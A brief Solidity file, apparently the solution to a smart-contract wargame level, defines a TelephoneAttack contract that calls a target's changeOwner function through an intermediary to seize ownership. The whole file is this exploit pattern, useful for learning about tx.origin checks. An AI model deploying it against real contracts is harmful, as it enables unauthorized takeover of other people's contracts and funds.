// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    function attack(address _target, address _newOwner) public {
        ITelephone(_target).changeOwner(_newOwner);
    }
}
